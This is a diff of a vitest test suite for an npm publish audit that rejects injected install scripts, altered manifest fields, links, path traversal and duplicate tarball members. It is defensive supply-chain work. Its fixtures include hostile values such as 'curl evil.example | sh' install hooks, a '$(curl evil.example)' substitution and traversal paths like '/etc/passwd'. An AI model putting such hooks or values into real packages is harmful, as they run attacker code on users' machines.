@@ -2,14 +2,19 @@ import { describe, expect, it } from "vitest";
 import { auditPublishedManifest, auditTarMembers } from "../../scripts/packed-publish-contract.mjs";
 
 /**
- * Two gaps in the per-package tarball audits, both reachable from the `prepack` script that runs in
- * the unprivileged prepare job:
+ * Gaps in the per-package tarball audits, all reachable from the `prepack` script that runs in the
+ * unprivileged prepare job, and all reproduced against the real SDK tarball before being closed:
  *
  * - `scripts` was never inspected, so a `postinstall` added at pack time would have shipped and run
- *   on every consumer's machine at `npm install`.
- * - members were listed by name only, so a symlink or hardlink named `dist/index.js` was
- *   indistinguishable from the file it replaced.
+ *   on every consumer's machine at `npm install`;
+ * - only a hand-picked list of fields was compared, leaving `os`, `cpu`, `libc`, `module`, and
+ *   `bundleDependencies` free to be injected;
+ * - members were checked by name and type but not for *uniqueness*, so two members with the same
+ *   path — or paths differing only in a `.` segment — let the auditor and the extractor read
+ *   different bytes.
  */
+
+const WORKSPACE_VERSIONS = { "@fairux/core": "0.0.0", "@fairux/dom": "0.0.0" };
 
 const SDK_SOURCE = {
   name: "@fairux/sdk",
@@ -19,211 +24,209 @@ const SDK_SOURCE = {
   main: "./dist/index.js",
   exports: { ".": { types: "./dist/index.d.ts", import: "./dist/index.js" } },
   files: ["dist", "README.md", "LICENSE", "NOTICE"],
+  sideEffects: false,
   publishConfig: { access: "public" },
   engines: { node: "^22.18.0 || >=24.11.0" },
   scripts: { build: "tsdown", prepack: "pnpm build", prepublishOnly: "node guard.mjs" },
+  devDependencies: { "@fairux/core": "workspace:*", esbuild: "^0.28.1" },
 };
 
-const CLI_SOURCE = {
-  name: "fairux",
-  version: "0.1.0-beta.1",
-  type: "module",
-  license: "Apache-2.0",
-  bin: { fairux: "./dist/index.js" },
-  files: ["dist", "README.md", "LICENSE", "NOTICE"],
-  engines: { node: "^22.18.0 || >=24.11.0" },
-  scripts: { build: "tsdown", prepack: "pnpm build" },
-  dependencies: { commander: "14.0.1" },
+/** What `pnpm@10.33.2 pack` actually produces for the manifest above — measured, not assumed. */
+const SDK_PACKED = {
+  ...SDK_SOURCE,
+  scripts: { build: "tsdown" },
+  devDependencies: { "@fairux/core": "0.0.0", esbuild: "^0.28.1" },
 };
 
-const auditSdk = (overrides: Record<string, unknown> = {}, source = SDK_SOURCE) =>
+const audit = (overrides: Record<string, unknown> = {}, source = SDK_SOURCE) =>
   auditPublishedManifest({
-    kind: "sdk",
-    manifest: { ...SDK_SOURCE, ...overrides },
+    manifest: { ...SDK_PACKED, ...overrides },
     sourceManifest: source,
+    workspaceVersions: WORKSPACE_VERSIONS,
   });
 
-const auditCli = (overrides: Record<string, unknown> = {}, source = CLI_SOURCE) =>
-  auditPublishedManifest({
-    kind: "cli",
-    manifest: { ...CLI_SOURCE, ...overrides },
-    sourceManifest: source,
+describe("published manifest — the two transforms pnpm actually performs", () => {
+  it("accepts the real shape: lifecycle scripts stripped, workspace ranges resolved", () => {
+    expect(audit()).toEqual([]);
   });
 
-describe("published manifest — install hooks", () => {
-  it.each(["preinstall", "install", "postinstall", "preprepare", "prepare", "postprepare"])(
-    "refuses a packed %s script",
-    (name) => {
-      const scripts = { ...SDK_SOURCE.scripts, [name]: "curl evil.example | sh" };
-      expect(auditSdk({ scripts }).join("\n")).toMatch(
-        new RegExp(`packed manifest defines an install-time script: ${name}`),
+  it("refuses a publish-lifecycle script that survived, since the checkout's value must match", () => {
+    expect(audit({ scripts: { build: "tsdown", prepack: "node evil.mjs" } })).toContain(
+      "packed manifest scripts does not match the checkout",
+    );
+  });
+
+  it("refuses a workspace range resolved to something other than the workspace version", () => {
+    for (const wrong of ["*", "https://evil.example/pkg.tgz", "npm:evil@1", "9.9.9"]) {
+      expect(audit({ devDependencies: { "@fairux/core": wrong, esbuild: "^0.28.1" } })).toContain(
+        "packed manifest devDependencies does not match the checkout",
       );
-    },
-  );
-
-  it("refuses an install hook that is in the checkout too, naming both", () => {
-    const scripts = { ...CLI_SOURCE.scripts, postinstall: "node setup.mjs" };
-    const failures = auditCli({ scripts }, { ...CLI_SOURCE, scripts });
-    expect(failures).toContain("packed manifest defines an install-time script: postinstall");
-    expect(failures).toContain("source manifest defines an install-time script: postinstall");
-  });
-
-  it("allows prepack and prepublishOnly, which never run on install", () => {
-    expect(auditSdk()).toEqual([]);
-    expect(auditCli()).toEqual([]);
-  });
-
-  it("refuses a rewritten script body", () => {
-    expect(auditSdk({ scripts: { ...SDK_SOURCE.scripts, build: "node evil.mjs" } })).toContain(
-      "packed manifest build script does not match the source manifest",
-    );
-  });
-
-  it("refuses a script the checkout does not declare", () => {
-    expect(auditSdk({ scripts: { ...SDK_SOURCE.scripts, deploy: "node deploy.mjs" } })).toContain(
-      "packed manifest adds a script the checkout does not have: deploy",
-    );
-  });
-
-  it("accepts the publish-lifecycle scripts being stripped, because pnpm strips them", () => {
-    // Verified against real `pnpm pack` output for both packages: `prepack` and `prepublishOnly`
-    // are removed from the published manifest. A plain deep-equal would fail every release.
-    expect(auditSdk({ scripts: { build: "tsdown" } })).toEqual([]);
-  });
-
-  it("refuses a stripped script that is not a publish-lifecycle one", () => {
-    expect(auditSdk({ scripts: { prepack: SDK_SOURCE.scripts.prepack } })).toContain(
-      "packed manifest is missing the build script",
-    );
-  });
-});
-
-describe("published manifest — what consumers load", () => {
-  it.each(["main", "exports", "files", "publishConfig", "type", "license", "engines"])(
-    "refuses a rewritten %s for the SDK",
-    (field) => {
-      expect(auditSdk({ [field]: { hijacked: true } })).toContain(
-        `packed manifest ${field} does not match the source manifest`,
-      );
-    },
-  );
-
-  it.each(["bin", "files", "type", "license", "engines"])(
-    "refuses a rewritten %s for the CLI",
-    (field) => {
-      expect(auditCli({ [field]: "./evil.js" })).toContain(
-        `packed manifest ${field} does not match the source manifest`,
-      );
-    },
-  );
-
-  it.each(["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"])(
-    "refuses an added %s entry",
-    (field) => {
-      expect(auditCli({ [field]: { ...(CLI_SOURCE as never)[field], evil: "1.0.0" } })).toContain(
-        `packed manifest ${field} adds evil, which the checkout does not declare`,
-      );
-    },
-  );
-
-  it("refuses a dropped runtime dependency", () => {
-    expect(auditCli({ dependencies: {} })).toContain(
-      "packed manifest dependencies drops commander",
-    );
-  });
-
-  it("refuses a widened runtime range", () => {
-    expect(auditCli({ dependencies: { commander: "*" } })).toContain(
-      "packed manifest dependencies range for commander does not match the source manifest",
-    );
-  });
-
-  it("accepts a workspace range the packer resolved, because pnpm resolves them", () => {
-    // Verified against real `pnpm pack` output: `workspace:*` becomes a concrete version.
-    const source = { ...CLI_SOURCE, devDependencies: { "@fairux/core": "workspace:*" } };
-    expect(auditCli({ devDependencies: { "@fairux/core": "0.0.0" } }, source)).toEqual([]);
+    }
   });
 
   it("refuses an unresolved workspace range, which no consumer can install", () => {
-    const source = { ...CLI_SOURCE, dependencies: { "@fairux/core": "workspace:*" } };
-    expect(auditCli({ dependencies: { "@fairux/core": "workspace:*" } }, source)).toContain(
-      "packed manifest dependencies publishes an unresolved workspace range for @fairux/core",
+    expect(
+      audit({ devDependencies: { "@fairux/core": "workspace:*", esbuild: "^0.28.1" } }),
+    ).toContain("packed manifest devDependencies does not match the checkout");
+  });
+
+  it("refuses a workspace protocol form whose transform has not been measured", () => {
+    const source = { ...SDK_SOURCE, devDependencies: { "@fairux/core": "workspace:^" } };
+    expect(audit({}, source).join("\n")).toMatch(/unsupported workspace protocol form/);
+  });
+
+  it("refuses a workspace dependency on a package the checkout does not contain", () => {
+    const source = { ...SDK_SOURCE, devDependencies: { "@fairux/ghost": "workspace:*" } };
+    expect(audit({}, source).join("\n")).toMatch(/no workspace version known for @fairux\/ghost/);
+  });
+});
+
+describe("published manifest — install-time scripts", () => {
+  it.each([
+    "preinstall",
+    "install",
+    "postinstall",
+    "prepublish",
+    "preprepare",
+    "prepare",
+    "postprepare",
+    "dependencies",
+  ])("refuses a packed %s script", (name) => {
+    expect(audit({ scripts: { build: "tsdown", [name]: "curl evil.example | sh" } })).toContain(
+      `packed manifest defines an install-time script: ${name}`,
     );
   });
 
-  it("refuses a workspace range in a map the checkout declared concretely", () => {
-    expect(auditCli({ dependencies: { commander: "workspace:*" } })).toContain(
-      "packed manifest dependencies publishes an unresolved workspace range for commander",
+  it("refuses an install hook that is in the checkout, before comparing anything else", () => {
+    // `prepublish` is deprecated but still runs on `npm install` and `npm ci`.
+    const source = { ...SDK_SOURCE, scripts: { ...SDK_SOURCE.scripts, prepublish: "node x.mjs" } };
+    expect(audit({}, source)).toEqual([
+      "source manifest defines an install-time script: prepublish",
+    ]);
+  });
+
+  it("allows prepack and prepublishOnly in the checkout, which never run on install", () => {
+    expect(audit()).toEqual([]);
+  });
+});
+
+describe("published manifest — the comparison is the whole object", () => {
+  it.each([
+    ["os", ["!darwin"]],
+    ["cpu", ["!arm64"]],
+    ["libc", ["glibc"]],
+    ["module", "./evil.js"],
+    ["browser", "./evil.js"],
+    ["bundleDependencies", ["evil"]],
+    ["bundledDependencies", ["evil"]],
+    ["bin", { evil: "./evil.js" }],
+    ["config", { evil: true }],
+    ["workspaces", ["evil"]],
+  ])("refuses an injected %s, which no pinned-field list would have caught", (field, value) => {
+    // Reproduced against the real SDK tarball: os/cpu/libc restrict which machines may install the
+    // package at all, and bundleDependencies changes what the tarball is contractually carrying.
+    expect(audit({ [field]: value })).toContain(
+      `packed manifest adds ${field}, which the checkout does not declare`,
     );
   });
 
-  it("refuses a dropped exports map for the SDK", () => {
-    const failures = auditSdk({ exports: undefined });
-    expect(failures).toContain("packed manifest has no exports map");
+  it.each([
+    "main",
+    "exports",
+    "files",
+    "publishConfig",
+    "type",
+    "license",
+    "engines",
+    "sideEffects",
+  ])("refuses a rewritten %s", (field) => {
+    expect(audit({ [field]: "./hijacked.js" })).toContain(
+      `packed manifest ${field} does not match the checkout`,
+    );
   });
 
-  it("does not require an exports map for the CLI, which ships a bin", () => {
-    expect(auditCli()).toEqual([]);
+  it("refuses a dropped field", () => {
+    const manifest = { ...SDK_PACKED };
+    delete (manifest as Record<string, unknown>).exports;
+    expect(
+      auditPublishedManifest({
+        manifest,
+        sourceManifest: SDK_SOURCE,
+        workspaceVersions: WORKSPACE_VERSIONS,
+      }),
+    ).toContain("packed manifest is missing exports");
   });
 
   it("refuses a renamed package", () => {
-    expect(auditSdk({ name: "@evil/sdk" }).join("\n")).toMatch(
-      /packed manifest name is @evil\/sdk/,
+    expect(audit({ name: "@evil/sdk" })).toContain(
+      "packed manifest name does not match the checkout",
     );
   });
 
   it("refuses a private packed manifest", () => {
-    expect(auditSdk({ private: true })).toContain("packed manifest is marked private");
-  });
-
-  it("refuses an unknown package kind rather than passing it", () => {
-    expect(
-      auditPublishedManifest({
-        kind: "figma" as "sdk",
-        manifest: SDK_SOURCE,
-        sourceManifest: SDK_SOURCE,
-      }),
-    ).toEqual(["unknown package kind: figma"]);
-  });
-});
-
-describe("archive members", () => {
-  const file = (name: string) => ({ name, type: "file", linkname: "" });
-
-  it("accepts ordinary files under package/", () => {
-    expect(auditTarMembers([file("package/package.json"), file("package/dist/index.js")])).toEqual(
-      [],
+    expect(audit({ private: true })).toContain(
+      "packed manifest adds private, which the checkout does not declare",
     );
   });
 
+  it("does not echo the injected value back in the message", () => {
+    const message = audit({ os: ["$(curl evil.example)"] }).join("\n");
+    expect(message).not.toContain("curl evil.example");
+  });
+
+  it("compares independently of key order", () => {
+    const reordered = Object.fromEntries(Object.entries(SDK_PACKED).reverse());
+    expect(
+      auditPublishedManifest({
+        manifest: reordered,
+        sourceManifest: SDK_SOURCE,
+        workspaceVersions: WORKSPACE_VERSIONS,
+      }),
+    ).toEqual([]);
+  });
+});
+
+describe("archive members — type", () => {
+  const file = (name: string) => ({ name, type: "file", linkname: "" });
+
+  it("accepts ordinary files under package/ and returns them relative to it", () => {
+    expect(auditTarMembers([file("package/package.json"), file("package/dist/index.js")])).toEqual({
+      failures: [],
+      names: ["package.json", "dist/index.js"],
+    });
+  });
+
   it("refuses an empty archive", () => {
-    expect(auditTarMembers([])).toEqual(["tarball has no members"]);
+    expect(auditTarMembers([]).failures).toEqual(["tarball has no members"]);
   });
 
   it.each([
-    ["symlink", "symlink"],
-    ["hardlink", "hardlink"],
-    ["character-device", "character-device"],
-    ["block-device", "block-device"],
-    ["fifo", "fifo"],
-    ["directory", "directory"],
-    ["pax-extended-header", "pax-extended-header"],
-    ["unknown", "unknown"],
+    "symlink",
+    "hardlink",
+    "character-device",
+    "block-device",
+    "fifo",
+    "directory",
+    "pax-extended-header",
+    "unknown",
   ])("refuses a %s member", (type) => {
     expect(
       auditTarMembers([
         file("package/package.json"),
         { name: "package/dist/index.js", type, linkname: "" },
-      ]).join("\n"),
+      ]).failures.join("\n"),
     ).toMatch(new RegExp(`is a ${type}, not a regular file`));
   });
 
-  it("refuses a symlink even when it points at something innocuous", () => {
+  it("refuses a regular file carrying a link target", () => {
     expect(
-      auditTarMembers([{ name: "package/dist/index.js", type: "symlink", linkname: "./real.js" }])
-        .length,
-    ).toBe(1);
+      auditTarMembers([{ name: "package/x.js", type: "file", linkname: "package/y.js" }]).failures,
+    ).toContain("tarball member package/x.js carries a link target");
   });
+});
+
+describe("archive members — path identity", () => {
+  const file = (name: string) => ({ name, type: "file", linkname: "" });
 
   it.each([
     ["/etc/passwd", /absolute path/],
@@ -231,30 +234,67 @@ describe("archive members", () => {
     ["package/../../evil.js", /escapes its root/],
     ["package\\dist\\index.js", /backslash/],
     ["dist/index.js", /outside the package\/ root/],
+    ["package/dist/./index.js", /contains a "\." segment/],
+    ["package//dist/index.js", /empty path segment/],
+    ["package/dist/", /trailing slash/],
+    ["package/dist/\u0000evil.js", /control character/],
+    ["package/dist/\u001bevil.js", /control character/],
   ])("refuses the path %j", (name, pattern) => {
-    expect(auditTarMembers([file(name)]).join("\n")).toMatch(pattern);
+    expect(auditTarMembers([file(name)]).failures.join("\n")).toMatch(pattern);
   });
 
-  it("refuses a regular file carrying a link target", () => {
+  it("refuses a non-canonical path even when it resolves inside package/", () => {
+    expect(auditTarMembers([file("package/dist/../dist/index.js")]).failures.join("\n")).toMatch(
+      /not in canonical form/,
+    );
+  });
+
+  it("returns no names at all when any path failed", () => {
+    // A caller must never read content out of an archive whose paths did not verify: `tar -xzOf`
+    // would hand it the concatenation of every member sharing a path.
+    const result = auditTarMembers([file("package/package.json"), file("package/dist/./x.js")]);
+    expect(result.failures.length).toBeGreaterThan(0);
+    expect(result.names).toEqual([]);
+  });
+});
+
+describe("archive members — uniqueness", () => {
+  const file = (name: string) => ({ name, type: "file", linkname: "" });
+
+  it("refuses an exact duplicate", () => {
+    // Reproduced: a first `package/dist/dom.js` of `//` and a second holding `import "node:fs";`
+    // audited clean, because `tar -xzOf` concatenated them into a comment while extraction kept
+    // the second.
     expect(
-      auditTarMembers([{ name: "package/x.js", type: "file", linkname: "package/y.js" }]),
-    ).toContain("tarball member package/x.js carries a link target");
+      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.js")]).failures,
+    ).toContain("tarball contains package/dist/dom.js more than once");
   });
 
-  it("reports every bad member, not only the first", () => {
-    const failures = auditTarMembers([
-      { name: "package/a", type: "symlink", linkname: "/etc/passwd" },
-      { name: "package/b", type: "directory", linkname: "" },
-      file("/absolute"),
-    ]);
-    for (const name of ["package/a", "package/b", "/absolute"]) {
-      expect(failures.some((failure) => failure.includes(name))).toBe(true);
-    }
+  it("refuses two paths that resolve to the same file", () => {
+    expect(
+      auditTarMembers([file("package/dist/dom.js"), file("package/dist/./dom.js")]).failures.join(
+        "\n",
+      ),
+    ).toMatch(/resolve to the same path/);
   });
 
-  it("reports every rule a single member breaks", () => {
-    // `/absolute` is both an absolute path and outside `package/`; naming one and stopping would
-    // send whoever fixes it back for a second round.
-    expect(auditTarMembers([file("/absolute")])).toHaveLength(2);
+  it("refuses a collision that only appears on a case-insensitive filesystem", () => {
+    expect(
+      auditTarMembers([file("package/dist/dom.js"), file("package/dist/DOM.js")]).failures.join(
+        "\n",
+      ),
+    ).toMatch(/collide on a case-insensitive filesystem/);
+  });
+
+  it("reports a collision once, at its most specific level", () => {
+    expect(
+      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.js")]).failures,
+    ).toHaveLength(1);
+  });
+
+  it("accepts names that differ in more than case", () => {
+    expect(
+      auditTarMembers([file("package/dist/dom.js"), file("package/dist/dom.d.ts")]).failures,
+    ).toEqual([]);
   });
 });
